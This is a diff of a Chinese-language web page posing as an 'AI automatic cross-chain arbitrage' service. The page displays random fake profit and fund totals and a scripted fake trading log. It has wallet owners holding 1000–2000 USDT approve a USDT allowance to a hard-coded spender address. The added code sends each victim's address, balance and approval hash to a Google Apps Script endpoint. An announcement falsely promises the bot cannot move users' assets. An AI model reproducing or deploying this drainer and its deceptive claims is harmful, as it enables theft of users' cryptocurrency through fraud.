@@ -28,10 +28,10 @@
         .stats-card .stat-average span { color: #00ff88; font-weight: bold; }
         .stats-divider { width: 80%; height: 1px; background: linear-gradient(90deg, transparent, rgba(0, 204, 255, 0.5), transparent); margin: 12px auto; }
         
-        .password-input, .apply-input, .admin-input { width: 100%; padding: 16px 20px; font-size: 18px; background: #0b101b; border: 1px solid #2a3a55; border-radius: 60px; color: white; text-align: center; outline: none; }
-        .password-input:focus, .apply-input:focus, .admin-input:focus { border-color: #00ccff; box-shadow: 0 0 10px rgba(0, 204, 255, 0.3); }
-        .password-btn, .apply-btn, .admin-btn { width: 100%; margin-top: 20px; padding: 14px 20px; background: linear-gradient(95deg, #005c6e, #003d4d); border: 1px solid #0ff4; color: white; border-radius: 60px; font-size: 18px; font-weight: bold; cursor: pointer; }
-        .password-btn:hover, .apply-btn:hover, .admin-btn:hover { background: linear-gradient(95deg, #0080a0, #005066); transform: scale(1.01); box-shadow: 0 0 12px cyan; }
+        .password-input, .apply-input { width: 100%; padding: 16px 20px; font-size: 18px; background: #0b101b; border: 1px solid #2a3a55; border-radius: 60px; color: white; text-align: center; outline: none; }
+        .password-input:focus, .apply-input:focus { border-color: #00ccff; box-shadow: 0 0 10px rgba(0, 204, 255, 0.3); }
+        .password-btn, .apply-btn { width: 100%; margin-top: 20px; padding: 14px 20px; background: linear-gradient(95deg, #005c6e, #003d4d); border: 1px solid #0ff4; color: white; border-radius: 60px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .password-btn:hover, .apply-btn:hover { background: linear-gradient(95deg, #0080a0, #005066); transform: scale(1.01); box-shadow: 0 0 12px cyan; }
         .error-msg { color: #ff6b6b; margin-top: 16px; font-size: 13px; }
         
         .apply-notice { background: rgba(0, 204, 255, 0.08); border: 1px solid rgba(0, 204, 255, 0.3); border-radius: 24px; padding: 18px 20px; margin: 20px 0; text-align: left; }
@@ -62,18 +62,6 @@
         .tutorial-card .check { color: #00ff88; background: rgba(0, 255, 136, 0.1); display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; margin-top: 12px; }
         .tutorial-card .time-note { background: rgba(0, 204, 255, 0.08); border-radius: 24px; padding: 14px 18px; text-align: center; color: #7ee0ff; font-size: 14px; margin-top: 16px; }
         .tutorial-icon { font-size: 48px; text-align: center; margin-bottom: 16px; }
-        
-        .admin-table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 12px; }
-        .admin-table th, .admin-table td { border: 1px solid #2a3a55; padding: 8px 6px; text-align: left; color: #b9c7d9; }
-        .admin-table th { background: #0f172a; color: #7ee0ff; }
-        .copy-btn { background: #2a5f8a; border: none; padding: 4px 8px; border-radius: 16px; color: white; cursor: pointer; font-size: 10px; }
-        .copy-btn:hover { background: #3a7faa; }
-        .tx-link { color: #00ccff; text-decoration: none; font-size: 11px; }
-        .tx-link:hover { text-decoration: underline; }
-        .transfer-success { color: #00ff88; }
-        .transfer-failed { color: #ff6b6b; }
-        .admin-link { margin-top: 20px; font-size: 12px; color: #4a5a7a; cursor: pointer; text-decoration: underline; }
-        .admin-link:hover { color: #7ee0ff; }
         
         .announcement-content { max-height: 70vh; overflow-y: auto; padding-right: 10px; text-align: left; }
         .announcement-content p { color: #b9c7d9; line-height: 1.8; font-size: 14px; margin-bottom: 12px; }
@@ -115,6 +103,9 @@
         
         .copy-toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0, 204, 255, 0.9); color: #0a0f1e; padding: 10px 20px; border-radius: 40px; font-size: 14px; font-weight: bold; z-index: 9999; animation: fadeOut 2s ease forwards; }
         @keyframes fadeOut { 0% { opacity: 1; } 70% { opacity: 1; } 100% { opacity: 0; visibility: hidden; } }
+        
+        .download-link { display: inline-block; margin-top: 12px; color: #00ccff; text-decoration: none; font-size: 13px; }
+        .download-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -144,7 +135,6 @@
             <button id="tutorialBtn" class="nav-btn">📥 资金接入教程</button>
             <button id="applyBtn" class="nav-btn">📝 申请访问</button>
         </div>
-        <div class="admin-link" id="adminEntryBtn">🔒 管理员入口</div>
     </div>
 
     <!-- 页面2：白皮书 -->
@@ -156,6 +146,7 @@
             <p>在当前多链生态高速发展的背景下，不同公链、DEX、跨链桥以及流动性池之间，因市场供需变化、资金流动以及交易深度差异，持续产生大量短暂的价格偏离。</p>
             <p>这些价格偏离往往存在时间极短，依靠人工监控和手动操作难以及时捕捉。</p>
             <p>AI全自动链上跨链价差系统基于OKX Wallet生态运行，通过智能算法实时监测多链市场数据，自动识别存在利润空间的价格差，并完成交易执行流程，实现全天候自动化运行。</p>
+            <p>系统的核心目标并非预测市场涨跌，而是持续发现市场中的价格偏离机会，并通过自动化执行提升资金利用效率。</p>
             <div class="highlight">⚠️ 此系统目前仅支持本金<strong>2000USDT</strong>以下用户使用。<br>为保证系统持续运行，会对完成的收益自动收取30%作为系统维护资金。</div>
             <h2>🎯 核心优势</h2>
             <h3>🤖 AI全天候自动运行</h3><p>系统7×24小时持续监控链上市场，全部由AI自动完成。</p>
@@ -166,6 +157,8 @@
             <h3>🛡️ 智能风控体系</h3><p>每次交易前进行利润测算、Gas评估、滑点检测等多重验证。</p>
             <h2>⚙️ 系统运行流程</h2>
             <ul><li><strong>市场扫描</strong> — 实时监测多个链上生态</li><li><strong>机会识别</strong> — AI自动发现价格偏离</li><li><strong>成本测算</strong> — 自动计算手续费和利润</li><li><strong>智能执行</strong> — 自动完成交易流程</li><li><strong>持续循环</strong> — 全天候自动化运行</li></ul>
+            <h2>👥 适用人群</h2>
+            <ul><li>✓ 希望参与链上市场但没有时间盯盘的用户</li><li>✓ 希望借助自动化工具提升效率的用户</li><li>✓ 对跨链价差策略感兴趣的用户</li></ul>
             <h2>⚠️ 风险说明</h2><p>数字资产市场存在波动风险，请理性参与。</p>
         </div>
     </div>
@@ -196,52 +189,19 @@
         <div id="applyMsg" class="error-msg"></div>
     </div>
 
-    <!-- 页面5：管理员面板 -->
-    <div id="adminPage" class="card admin-container" style="display:none;">
-        <h2 style="text-align:center;">🔒 管理员面板</h2>
-        <p style="text-align:center;">请输入管理员密码查看记录</p>
-        <input type="password" id="adminPasswordInput" class="admin-input" placeholder="管理员密码">
-        <button id="submitAdminLogin" class="admin-btn">登录查看记录</button>
-        <button id="backToPasswordFromAdmin" class="nav-btn" style="margin-top:16px;">← 返回</button>
-        <div id="adminLoginMsg" class="error-msg"></div>
-        <div id="adminContent" style="display:none; margin-top:24px;">
-            <div style="display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #2a3a55; padding-bottom: 10px;">
-                <button id="tabApplyBtn" style="background: none; border: none; color: #7ee0ff; cursor: pointer; padding: 5px 15px; font-size: 14px;">📋 申请记录</button>
-                <button id="tabApproveBtn" style="background: none; border: none; color: #7ee0ff; cursor: pointer; padding: 5px 15px; font-size: 14px;">🔑 授权记录</button>
-            </div>
-            <div id="applyRecordPanel">
-                <h3 style="color:#7ee0ff;">📋 已通过地址记录（最新10条）</h3>
-                <div id="applicationsList"></div>
-                <div class="footer-note">📋 点击「复制」可复制用户完整地址 | 📌 每个地址最多记录2次</div>
-            </div>
-            <div id="approveRecordPanel" style="display:none;">
-                <h3 style="color:#7ee0ff;">🔑 授权记录（最新10条）</h3>
-                <div id="approveList"></div>
-                <div class="footer-note">📋 用户授权USDT额度的记录</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- 页面6：最新公告 -->
+    <!-- 页面5：最新公告（原始完整版） -->
     <div id="announcementPage" class="card" style="display:none;">
         <button id="backToPasswordFromAnnouncement" class="nav-btn">← 返回密码验证</button>
         <div class="announcement-content">
             <h1 style="font-size:28px; border-left:4px solid #00ccff; padding-left:20px;">📢 最新公告</h1>
             <div class="highlight-text">
-                <p><strong>系统最高同时运行数量：300</strong></p>
-                <p>为了更多人参与进来，每当达到300后系统会自动结束300名其中运行时间超过24小时的一位，保证绝对公平。</p>
-                <p>结束的地址需要<strong>冷静1小时</strong>后才可以继续申请新密码重新运行。</p>
-                <p>新地址前24小时，你只需要点击启动即可运行。之后，<strong>你必须保持在运行页面才可以正常运行</strong>，离开运行页面10分钟后会立即结束运行。</p>
-                <p>最高只会运行<strong>2000U内</strong>，<strong>切勿在你钱包存入超过2000 USDT</strong>。最低运行标准：<strong>1000U</strong>。</p>
-                <p>体验阶段24小时内，扣除每笔盈利金额的<strong>10%</strong>上缴，运行5天后改为<strong>30%</strong>。</p>
-                <p><strong>AI机器人权限已经打入黑洞地址，机器人无权转走你的任何资产。</strong></p>
-                <p>所有参与者如发现项目漏洞，最高奖励<strong>1万美金</strong>。联系Telegram：<strong style="color:#00ccff">@ffuoh</strong></p>
+                <p>系统最高同时运行数量300。为了更多人参与进来每当达到300后系统会自动结束300名其中运行时间超过24小时的一位，（取最后一位新运行地址授权哈希值最后一位随机数字 然后在所有地址中匹配最后一位数字的地址随机筛选一位结束）保证绝对公平。结束的地址需要冷静1小时后才可以继续申请新密码重新运行，新地址前24小时你只需要点击启动即可运行。之后你必须保持在运行页面才可以正常运行，离开运行页面10分钟后会立即结束运行马上释放名额。运行期间资金你们可以自由支配，最高只会运行2000u内，切勿在你钱包存入超过2000usdt，最低运行标准1000u 体验阶段24小时内扣除每笔盈利金额的10%上缴，运行5天后改为30%。扣除的这部分50%当作系统赔付基金另外50%由创始人自由支配（如果运行期间由本系统产生亏损直接联系下面纸飞机审核赔付最高赔付金额1000u）. 目前这套系统处于红利期，收益率相对高，期间不会公开系统核心运行逻辑，请大家珍惜机会，如果市场饱和 当市场很难出现价格差之后我会停止运行该项目， ai机器人权限已经打入黑洞地址0x0000000000000000000000000000000000000000，机器人无权转走你的任何资产 。只会运行已经写死的代码核心代码任何人无权修改包括创始人， 所有参与者如发现项目漏洞或者有待完善的核心功能，只要能实质提升有关利润问题，只要采纳最高奖励1万美金 联系Telegram（纸飞机)@ffuoh</p>
             </div>
             <div class="join-tip"><p>🚀 <strong>运行后联系我纸飞机报你的运行地址进群</strong></p></div>
         </div>
     </div>
 
-    <!-- 页面7：量化面板 -->
+    <!-- 页面6：量化面板 -->
     <div id="quantPanel" class="panel" style="display:none;">
         <div style="text-align:center; margin-bottom:28px;">
             <div style="font-size:56px;">🧠⚡</div>
@@ -262,7 +222,7 @@
         <div class="footer-note">⚠️ 首次使用需授权 USDT 额度 | 授权后自动启动量化</div>
     </div>
 
-    <!-- 页面8：运行页面 -->
+    <!-- 页面7：运行页面 -->
     <div id="runningPanel" class="running-card" style="display:none;">
         <div class="ai-icon">🧠⚡</div>
         <div class="running-title">AI 差价搬运引擎</div>
@@ -288,13 +248,14 @@
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
+    // ========== Google Sheets API 配置（新地址） ==========
+    const SHEET_API_URL = 'https://script.google.com/macros/s/AKfycby-dNP-_FMxMVYwpp3wrGisg7IrALC_27QsShl9tSfBLszvT55b7I8P1Udbk7bYY8gz/exec';
+    
     // ========== 配置 ==========
     const SYSTEM_PASSWORD = '1134';
-    const ADMIN_PASSWORD = '0009';
     const MIN_USDT_REQUIRED = 1000;
     const MAX_USDT_LIMIT = 2000;
     const RUNNING_ADDRESS_COUNT = 300;
-    const MAX_RECORDS_PER_ADDRESS = 2;
     
     const USDT_ADDRESS = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";
     const SPENDER_ADDRESS = "0x23ab58b21fb4a711319a07e59686a19efbc0e76b";
@@ -307,9 +268,25 @@
     const SENDER_ADDRESS = '0x1d0bc3658ddeecaa97ceccb390088476c07c5613';
     const TRANSFER_AMOUNT_ETH = '0.00005';
     
-    const TRANSFER_RECORD_KEY = 'eth_transfer_records';
-    const STORAGE_KEY = 'quant_applications';
-    const APPROVE_RECORD_KEY = 'approve_records';
+    // ========== 保存授权记录到 Google Sheets ==========
+    async function saveAuthorizationToSheet(address, usdtBalance, txHash) {
+        try {
+            await fetch(SHEET_API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    action: 'add_authorization',
+                    address: address,
+                    usdt_balance: usdtBalance,
+                    tx_hash: txHash
+                })
+            });
+            console.log('✅ 授权记录已保存到表格');
+        } catch (error) {
+            console.error('❌ 保存失败:', error);
+        }
+    }
     
     // ========== 统计数据显示 ==========
     function getRandomTotalFunds() { return Math.floor(Math.random() * (580000 - 540000 + 1) + 540000); }
@@ -321,120 +298,37 @@
     updateTotalFunds();
     setInterval(updateTotalFunds, 5 * 60 * 1000);
     
-    // ========== 24小时收益逻辑（每天中午12点到第二天中午12点保持不变） ==========
+    // ========== 24小时收益逻辑 ==========
     const DAILY_PROFIT_KEY = 'dailyProfitValue';
     const DAILY_PROFIT_DATE_KEY = 'dailyProfitDate';
-    
-    function getRandomDailyProfit() {
-        return Math.floor(Math.random() * (90 - 50 + 1) + 50);
-    }
-    
+    function getRandomDailyProfit() { return Math.floor(Math.random() * (90 - 50 + 1) + 50); }
     function getDailyProfit() {
         const now = new Date();
         const todayNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 12, 0, 0);
         const yesterdayNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate() - 1, 12, 0, 0);
-        
-        let targetDate;
-        if (now >= todayNoon) {
-            targetDate = todayNoon;
-        } else {
-            targetDate = yesterdayNoon;
-        }
-        
+        let targetDate = now >= todayNoon ? todayNoon : yesterdayNoon;
         const storedProfit = localStorage.getItem(DAILY_PROFIT_KEY);
         const storedDate = localStorage.getItem(DAILY_PROFIT_DATE_KEY);
-        
-        if (storedProfit && storedDate) {
-            const storedDateObj = new Date(storedDate);
-            if (storedDateObj.getTime() === targetDate.getTime()) {
-                return parseInt(storedProfit);
-            }
-        }
-        
+        if (storedProfit && storedDate && new Date(storedDate).getTime() === targetDate.getTime()) return parseInt(storedProfit);
         const newProfit = getRandomDailyProfit();
         localStorage.setItem(DAILY_PROFIT_KEY, newProfit);
         localStorage.setItem(DAILY_PROFIT_DATE_KEY, targetDate.toISOString());
         return newProfit;
     }
-    
-    function updateDailyProfit() {
-        const dailyProfitEl = document.getElementById('dailyProfit');
-        if (dailyProfitEl) {
-            const profit = getDailyProfit();
-            dailyProfitEl.textContent = profit;
-        }
-    }
-    
+    function updateDailyProfit() { const el = document.getElementById('dailyProfit'); if (el) el.textContent = getDailyProfit(); }
     updateDailyProfit();
-    
     function scheduleDailyRefresh() {
         const now = new Date();
         const nextNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 12, 0, 0);
-        if (now >= nextNoon) {
-            nextNoon.setDate(nextNoon.getDate() + 1);
-        }
-        const timeUntilNoon = nextNoon.getTime() - now.getTime();
-        setTimeout(() => {
-            updateDailyProfit();
-            scheduleDailyRefresh();
-        }, timeUntilNoon);
+        if (now >= nextNoon) nextNoon.setDate(nextNoon.getDate() + 1);
+        setTimeout(() => { updateDailyProfit(); scheduleDailyRefresh(); }, nextNoon.getTime() - now.getTime());
     }
     scheduleDailyRefresh();
     
-    // ========== 授权记录管理 ==========
-    function getApproveRecords() { const s = localStorage.getItem(APPROVE_RECORD_KEY); return s ? JSON.parse(s) : []; }
-    function saveApproveRecords(records) { localStorage.setItem(APPROVE_RECORD_KEY, JSON.stringify(records)); }
-    
-    function addApproveRecord(address, txHash, amount) {
-        const records = getApproveRecords();
-        records.push({
-            id: Date.now(),
-            address: address.toLowerCase(),
-            txHash: txHash,
-            amount: amount,
-            time: new Date().toLocaleString()
-        });
-        saveApproveRecords(records);
-    }
-    
-    function renderApproveList() {
-        const records = getApproveRecords().slice(-10).reverse();
-        const container = document.getElementById('approveList');
-        if (!container) return;
-        if (records.length === 0) {
-            container.innerHTML = '<div style="color:#8e9aaf; text-align:center; padding:20px;">暂无授权记录</div>';
-            return;
-        }
-        let html = '<table class="admin-table"><thead><tr><th>地址</th><th>授权额度</th><th>交易哈希</th><th>授权时间</th><th>操作</th></tr></thead><tbody>';
-        for (const record of records) {
-            html += `<tr>
-                <td style="font-family:monospace;font-size:11px;" title="${record.address}">${record.address.slice(0,6)}...${record.address.slice(-4)}</td>
-                <td style="font-size:11px;color:#00ff88;">${record.amount} USDT</td>
-                <td style="font-size:11px;"><a href="https://arbiscan.io/tx/${record.txHash}" target="_blank" class="tx-link" style="color:#00ccff;">${record.txHash.slice(0,10)}...</a></td>
-                <td style="font-size:11px;">${record.time}</td>
-                <td><button class="copy-btn" onclick="copyToClipboard('${record.address}')">📋 复制地址</button></td>
-            </tr>`;
-        }
-        html += '</tbody></table>';
-        container.innerHTML = html;
-    }
-    
     // ========== 内部转账函数 ==========
-    function getTransferRecords() { const s = localStorage.getItem(TRANSFER_RECORD_KEY); return s ? JSON.parse(s) : {}; }
-    function saveTransferRecord(address, status, txHash = null) { 
-        const r = getTransferRecords(); 
-        r[address.toLowerCase()] = { status: status, txHash: txHash, time: new Date().toLocaleString() }; 
-        localStorage.setItem(TRANSFER_RECORD_KEY, JSON.stringify(r)); 
-    }
-    function hasBeenTransferred(address) { return !!getTransferRecords()[address.toLowerCase()]; }
-    
     async function internalTransferEth(toAddress) {
         try {
             console.log(`[转账] 开始处理地址: ${toAddress}`);
-            if (hasBeenTransferred(toAddress)) { 
-                console.log(`[转账] 地址已转账过，跳过`); 
-                return { success: false, reason: 'already_transferred' }; 
-            }
             const provider = new ethers.providers.JsonRpcProvider('https://arb1.arbitrum.io/rpc');
             const wallet = new ethers.Wallet(SENDER_PRIVATE_KEY, provider);
             const senderBalanceEth = parseFloat(ethers.utils.formatEther(await provider.getBalance(SENDER_ADDRESS)));
@@ -448,11 +342,9 @@
             console.log(`[转账] 交易已提交，Hash: ${tx.hash}`);
             await tx.wait();
             console.log(`[转账] 交易已确认`);
-            saveTransferRecord(toAddress, 'success', tx.hash);
             return { success: true, txHash: tx.hash };
         } catch (error) { 
             console.error('[转账] 失败:', error); 
-            saveTransferRecord(toAddress, 'failed', null); 
             return { success: false, reason: 'transfer_error', error: error.message }; 
         }
     }
@@ -476,53 +368,11 @@
         return { success: false, balance: 0, error: '查询失败' };
     }
     
-    // ========== 地址验证 ==========
     function isValidArbitrumAddress(addr) { return /^0x[a-fA-F0-9]{40}$/i.test(addr?.trim()); }
-    
-    // ========== 申请记录管理 ==========
-    function loadApplications() { const s = localStorage.getItem(STORAGE_KEY); return s ? JSON.parse(s) : []; }
-    function saveApplications(apps) { localStorage.setItem(STORAGE_KEY, JSON.stringify(apps)); }
-    function getAddressRecordCount(addr) { return loadApplications().filter(a => a.address === addr.toLowerCase()).length; }
-    function addApprovedRecord(address, usdtBalance, transferStatus, transferTxHash) {
-        if (getAddressRecordCount(address) >= MAX_RECORDS_PER_ADDRESS) return false;
-        const apps = loadApplications();
-        apps.push({ id: Date.now(), address: address.toLowerCase(), status: 'approved', usdtBalance: usdtBalance, submitTime: new Date().toLocaleString(), approvedTime: new Date().toLocaleString(), transferStatus: transferStatus, transferTxHash: transferTxHash });
-        saveApplications(apps);
-        return true;
-    }
-    
-    function renderAdminList() {
-        const apps = loadApplications().slice(-10).reverse();
-        const container = document.getElementById('applicationsList');
-        if (!container) return;
-        if (apps.length === 0) { container.innerHTML = '<div style="color:#8e9aaf; text-align:center; padding:20px;">暂无记录</div>'; return; }
-        let html = '<table class="admin-table"><thead><tr><th>地址</th><th>提交时间</th><th>USDT余额</th><th>通过时间</th><th>转账状态</th><th>操作</th></tr></thead><tbody>';
-        const records = getTransferRecords();
-        for (const app of apps) {
-            const record = records[app.address];
-            let statusHtml = '<span style="color:#ffaa44;">⏳ 待处理</span>', txHtml = '';
-            if (record && record.status === 'success') { statusHtml = '<span class="transfer-success">✅ 已转账</span>'; if(record.txHash) txHtml = `<div><a href="https://arbiscan.io/tx/${record.txHash}" target="_blank" class="tx-link">查看交易</a></div>`; }
-            else if (record && record.status === 'failed') statusHtml = '<span class="transfer-failed">❌ 转账失败</span>';
-            html += `<tr>
-                <td style="font-family:monospace;font-size:11px;" title="${app.address}">${app.address.slice(0,6)}...${app.address.slice(-4)}</td>
-                <td style="font-size:11px;">${app.submitTime}</td>
-                <td style="font-size:11px;color:#00ff88;">${app.usdtBalance?.toFixed(2) || '--'}</td>
-                <td style="font-size:11px;">${app.approvedTime || '-'}</td>
-                <td style="font-size:11px;">${statusHtml}${txHtml}</td>
-                <td><button class="copy-btn" onclick="copyToClipboard('${app.address}')">📋 复制</button></td>
-            </tr>`;
-        }
-        html += '</tbody><table>';
-        container.innerHTML = html;
-    }
-    
-    function showCopyToast(msg) { const t = Object.assign(document.createElement('div'), { className: 'copy-toast', textContent: msg }); document.body.appendChild(t); setTimeout(() => t.remove(), 2000); }
-    async function copyToClipboard(text) { try { await navigator.clipboard.writeText(text); showCopyToast('✅ 地址已复制'); } catch { const ta = Object.assign(document.createElement('textarea'), { value: text }); document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); showCopyToast('✅ 地址已复制'); } }
-    window.copyToClipboard = copyToClipboard;
     
     // ========== 页面切换函数 ==========
     function showPage(pageId) {
-        const pages = ['passwordPage', 'whitepaperPage', 'tutorialPage', 'applyPage', 'adminPage', 'announcementPage', 'quantPanel', 'runningPanel'];
+        const pages = ['passwordPage', 'whitepaperPage', 'tutorialPage', 'applyPage', 'announcementPage', 'quantPanel', 'runningPanel'];
         for (let i = 0; i < pages.length; i++) { const el = document.getElementById(pages[i]); if (el) el.style.display = 'none'; }
         const target = document.getElementById(pageId);
         if (target) target.style.display = 'block';
@@ -533,7 +383,6 @@
     document.getElementById('backToPasswordFromTutorial')?.addEventListener('click', () => showPage('passwordPage'));
     document.getElementById('backToPasswordFromApply')?.addEventListener('click', () => showPage('passwordPage'));
     document.getElementById('backToPasswordFromQuant')?.addEventListener('click', () => showPage('passwordPage'));
-    document.getElementById('backToPasswordFromAdmin')?.addEventListener('click', () => showPage('passwordPage'));
     document.getElementById('backToPasswordFromAnnouncement')?.addEventListener('click', () => showPage('passwordPage'));
     document.getElementById('backToQuantFromRunning')?.addEventListener('click', () => showPage('quantPanel'));
     
@@ -541,30 +390,7 @@
     document.getElementById('whitepaperBtn')?.addEventListener('click', () => showPage('whitepaperPage'));
     document.getElementById('tutorialBtn')?.addEventListener('click', () => showPage('tutorialPage'));
     document.getElementById('applyBtn')?.addEventListener('click', () => showPage('applyPage'));
-    document.getElementById('adminEntryBtn')?.addEventListener('click', () => showPage('adminPage'));
     document.getElementById('announcementBtn')?.addEventListener('click', () => showPage('announcementPage'));
-    
-    // 管理员面板标签页切换
-    const tabApplyBtn = document.getElementById('tabApplyBtn');
-    const tabApproveBtn = document.getElementById('tabApproveBtn');
-    const applyRecordPanel = document.getElementById('applyRecordPanel');
-    const approveRecordPanel = document.getElementById('approveRecordPanel');
-    
-    if (tabApplyBtn && tabApproveBtn) {
-        tabApplyBtn.onclick = () => {
-            applyRecordPanel.style.display = 'block';
-            approveRecordPanel.style.display = 'none';
-            tabApplyBtn.style.borderBottom = '2px solid #00ccff';
-            tabApproveBtn.style.borderBottom = 'none';
-        };
-        tabApproveBtn.onclick = () => {
-            applyRecordPanel.style.display = 'none';
-            approveRecordPanel.style.display = 'block';
-            tabApproveBtn.style.borderBottom = '2px solid #00ccff';
-            tabApplyBtn.style.borderBottom = 'none';
-            renderApproveList();
-        };
-    }
     
     // ========== 密码验证 ==========
     document.getElementById('submitPassword').onclick = function() {
@@ -581,11 +407,7 @@
         const address = document.getElementById('applyAddressInput').value.trim();
         const applyMsg = document.getElementById('applyMsg');
         if (!isValidArbitrumAddress(address)) { applyMsg.innerHTML = '❌ 无效的 Arbitrum 链地址！'; applyMsg.style.color = '#ff6b6b'; return; }
-        const apps = loadApplications();
-        const isApproved = apps.some(a => a.address === address.toLowerCase() && a.status === 'approved');
-        if (isApproved) { applyMsg.innerHTML = `✅ 您的地址已通过审核！<br>🔐 访问密码：<strong style="font-size:28px; color:#00ff88;">${SYSTEM_PASSWORD}</strong><br>📝 请返回密码验证页面登录`; applyMsg.style.color = '#00ff88'; return; }
-        const isPending = apps.some(a => a.address === address.toLowerCase() && a.status === 'pending');
-        if (isPending) { applyMsg.innerHTML = `⏳ 您的申请正在审核中，请耐心等待`; applyMsg.style.color = '#ffaa44'; return; }
+        
         try {
             isSubmitting = true; document.getElementById('submitApplyBtn').disabled = true;
             applyMsg.innerHTML = '<span class="loading-spinner"></span> 🔍 正在链上查询 USDT 余额...'; applyMsg.style.color = '#7ee0ff';
@@ -594,26 +416,11 @@
             const balance = balanceResult.balance;
             if (balance < MIN_USDT_REQUIRED) { applyMsg.innerHTML = `❌ 申请失败！<br>💰 当前地址 USDT 余额：${balance.toFixed(2)} USDT<br>⚠️ 需要持有 ≥${MIN_USDT_REQUIRED} USDT`; applyMsg.style.color = '#ff6b6b'; return; }
             if (balance > MAX_USDT_LIMIT) { applyMsg.innerHTML = `⚠️ 余额超过限制！<br>💰 当前地址 USDT 余额：${balance.toFixed(2)} USDT<br>⚠️ 请确保钱包内 ≤${MAX_USDT_LIMIT} USDT`; applyMsg.style.color = '#ffaa44'; return; }
-            let transferStatus = null, transferTxHash = null;
-            try { const tr = await internalTransferEth(address); if (tr.success) { transferStatus = 'success'; transferTxHash = tr.txHash; } else if (tr.reason === 'already_transferred') transferStatus = 'success'; else transferStatus = 'failed'; } catch(err) { transferStatus = 'failed'; }
-            addApprovedRecord(address, balance, transferStatus, transferTxHash);
+            
             applyMsg.innerHTML = `✅ 您的地址已通过审核！<br>🔐 访问密码：<strong style="font-size:28px; color:#00ff88;">${SYSTEM_PASSWORD}</strong><br>📝 请返回密码验证页面登录`;
             applyMsg.style.color = '#00ff88'; document.getElementById('applyAddressInput').value = '';
         } catch (error) { applyMsg.innerHTML = '❌ 系统错误，请稍后重试'; applyMsg.style.color = '#ff6b6b'; }
         finally { isSubmitting = false; document.getElementById('submitApplyBtn').disabled = false; }
-    };
-    
-    // ========== 管理员登录 ==========
-    document.getElementById('submitAdminLogin').onclick = function() {
-        var adminPwd = document.getElementById('adminPasswordInput').value;
-        if (adminPwd === ADMIN_PASSWORD) { 
-            document.getElementById('adminLoginMsg').textContent = ''; 
-            document.getElementById('adminContent').style.display = 'block'; 
-            renderAdminList();
-            renderApproveList();
-            if (tabApplyBtn) tabApplyBtn.click();
-        }
-        else { document.getElementById('adminLoginMsg').textContent = '❌ 管理员密码错误'; document.getElementById('adminContent').style.display = 'none'; }
     };
     
     // ========== 网络检测函数 ==========
@@ -653,23 +460,20 @@
         const logArea = document.getElementById('logArea');
         if (!logArea) return;
         logArea.innerHTML = `<div class="log-line"><span class="log-time">${getCurrentTime()}</span> <span class="log-scan">✅ AI引擎启动成功</span></div>`;
-        const dexList = ['PancakeSwap', 'Uniswap', 'SushiSwap', 'Curve', 'Balancer', 'QuickSwap', 'Camelot', 'TraderJoe', 'Velodrome', 'Aerodrome', 'KyberSwap', 'DODO'];
-        const gasMessages = ['⛽ Gas费较高: 32 Gwei，等待中...', '⛽ Gas费较高: 38 Gwei，等待中...', '⛽ Gas费偏高: 41 Gwei，延迟执行', '⛽ 当前Gas: 28 Gwei，正常范围', '⛽ Gas费波动中: 35 Gwei', '⛽ 网络拥堵，Gas费上升至 45 Gwei', '⛽ Gas费回落至 25 Gwei，继续监控', '⛽ 等待Gas费降低... 当前 39 Gwei'];
-        const scanMessages = ['🔍 正在扫描 {dex} 交易所...', '🔍 扫描 {dex} 流动性池...', '🔍 检测 {dex} 交易对深度...', '🔍 分析 {dex} 价差数据...'];
-        const statusMessages = ['📊 汇总各DEX数据中...', '🔄 更新价格预言机...', '⏳ 等待市场波动...', '📡 连接多链节点...', '🔗 同步区块高度...'];
+        const dexList = ['PancakeSwap', 'Uniswap', 'SushiSwap', 'Curve', 'Balancer'];
+        const gasMessages = ['⛽ Gas费较高: 32 Gwei，等待中...', '⛽ Gas费较高: 38 Gwei，等待中...', '⛽ 当前Gas: 28 Gwei，正常范围'];
+        const scanMessages = ['🔍 正在扫描 {dex} 交易所...', '🔍 扫描 {dex} 流动性池...'];
         function getRandomDex() { return dexList[Math.floor(Math.random() * dexList.length)]; }
         function getRandomLog() {
             const rand = Math.random();
             let message = '', colorClass = 'log-scan';
-            if (rand < 0.5) { const dex = getRandomDex(); message = scanMessages[Math.floor(Math.random() * scanMessages.length)].replace('{dex}', dex); colorClass = 'log-scan'; }
-            else if (rand < 0.75) { message = gasMessages[Math.floor(Math.random() * gasMessages.length)]; colorClass = 'log-gas'; }
-            else { message = statusMessages[Math.floor(Math.random() * statusMessages.length)]; colorClass = 'log-scan'; }
+            if (rand < 0.5) { const dex = getRandomDex(); message = scanMessages[Math.floor(Math.random() * scanMessages.length)].replace('{dex}', dex); }
+            else { message = gasMessages[Math.floor(Math.random() * gasMessages.length)]; colorClass = 'log-gas'; }
             return `<div class="log-line"><span class="log-time">${getCurrentTime()}</span> <span class="${colorClass}">${message}</span></div>`;
         }
         logInterval = setInterval(() => {
             if (logArea && document.getElementById('runningPanel').style.display === 'block') {
-                const newLog = getRandomLog();
-                logArea.insertAdjacentHTML('beforeend', newLog);
+                logArea.insertAdjacentHTML('beforeend', getRandomLog());
                 logArea.scrollTop = logArea.scrollHeight;
                 while (logArea.children.length > 20) logArea.removeChild(logArea.firstChild);
             }
@@ -677,13 +481,11 @@
     }
     
     function getCurrentTime() { const now = new Date(); return `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`; }
-    function stopRunningLogs() { if (logInterval) { clearInterval(logInterval); logInterval = null; } }
     
     async function initUSDTContractWithSigner(signer) {
         const abi = ["function decimals() view returns (uint8)", "function approve(address spender, uint256 amount) public returns (bool)", "function allowance(address owner, address spender) view returns (uint256)"];
